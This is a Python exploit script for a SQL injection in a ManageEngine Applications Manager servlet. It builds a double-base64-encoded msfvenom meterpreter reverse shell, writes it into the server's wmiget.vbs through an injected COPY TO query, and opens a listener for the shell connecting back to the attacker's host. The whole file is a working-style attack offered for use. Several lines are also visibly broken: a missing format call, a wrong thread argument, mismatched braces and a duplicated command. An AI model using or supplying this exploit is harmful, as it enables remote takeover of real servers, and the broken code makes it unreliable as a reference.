#!/usr/bin/env python3

"""
Author: Aleksa Zatezalo
Date: December 2024
Version: 1.0
Description: RCE exploit for an SQL Injection identified in the ManageEngine AMUserResourceSyncServlet servlet. Works on Windows Systems.
"""

import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import subprocess
import base64
import threading
import socket

def remove_tabs(input_string):
    # Replace all tabs with an empty string
    return input_string.replace("\t", "")

def replace_carriage_returns(input_string):
    # Replace all carriage returns with a colon
    return input_string.replace("\n", ":")

def replace_double_colons(input_string):
    # Replace all occurrences of "::" with ":"
    return input_string.replace("::", ":")

def base64_encode(data):
    # If input is a string, encode it to bytes
    if isinstance(data, str):
        data = data.encode('utf-8')
    # Encode the bytes to Base64
    encoded_data = base64.b64encode(data)
    # Convert the encoded bytes back to a string and return
    return encoded_data.decode('utf-8')

def gen_rev_shell(host, port):
      print("Generating Exploit With MSF Venom. Please Wait...")
      msf_output = 'msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -f vbs'.(lhost = host, lport = port)
      rev_shell = subprocess.run(msf_output,  shell=True, text=True, capture_output=True).stdout
      rev_shell = subprocess.run(msf_output,  shell=True, text=True, capture_output=True).stdout

      print("Making the reverse shell a one-liner...")
      rev_shell = remove_tabs(rev_shell)
      rev_shell = replace_carriage_returns(rev_shell)
      rev_shell = replace_double_colons(rev_shell)
      
      print("Double Base64 Encoding the reverse shell...")
      rev_shell = base64_encode(rev_shell)
      rev_shell = base64_encode(rev_shell)
      return rev_shell

def revShellCopyTo(url, revshell):
    copy_to =  ';copy+(select+convert_from(decode($${shell}}$$,$$base64$$),$$utf-8$$))+to+$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;'.format(shell=revshell)
    r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
					  params='ForMasRange=1&userId=1%s' % copy_to, verify=False)
    

# Thread to send the reverse shell request
def send_rev_shell_request(url, revshell, event):
    revShellCopyTo(url, revshell)
    event.set()  # Signal that the request is complete

# Thread to set up the socket server
def setup_socket_server(port, event):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind(('0.0.0.0', port))
        server_socket.listen(1)
        print(f"[+] Listening on port {port}...")
        
        # Wait for the event signaling that the request is complete
        event.wait()
        print("[+] Reverse shell request completed. Waiting for a connection...")

        conn, addr = server_socket.accept()
        print(f"[+] Connection established with {addr}")
        
        # Allow user interaction with the socket
        try:
            while True:
                cmd = input("Shell> ")
                if cmd.lower() in ('exit', 'quit'):
                    break
                conn.sendall(cmd.encode() + b'\n')
                data = conn.recv(1024)
                print(data.decode(), end="")
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
        finally:
            conn.close()


def main():
	if len(sys.argv) != 4:
		print(f"(+) usage %s <target> <lhost> <lport>" % sys.argv[0])
		print(f"(+) eg: %s target lhost lport" % sys.argv[0])
		sys.exit(1)
	
	# Arguments
	target = sys.argv[1]
	host = sys.argv[2]
	port = sys.argv[3]
    
    # Generate Revshell 
	revshell = gen_rev_shell(host, port)
	
    # Multi-threaded loop to get listener
	event = threading.Event()
	request_thread = threading.Thread(thread=send_rev_shell_request, args=(target, revshell, event))
	socket_thread = threading.Thread(target=setup_socket_server, args=(port, event))
	
	request_thread.start()
	socket_thread.start()
    
    # Wait for both threads to complete
	request_thread.join()
	socket_thread.join()

if __name__ == '__main__':
	main()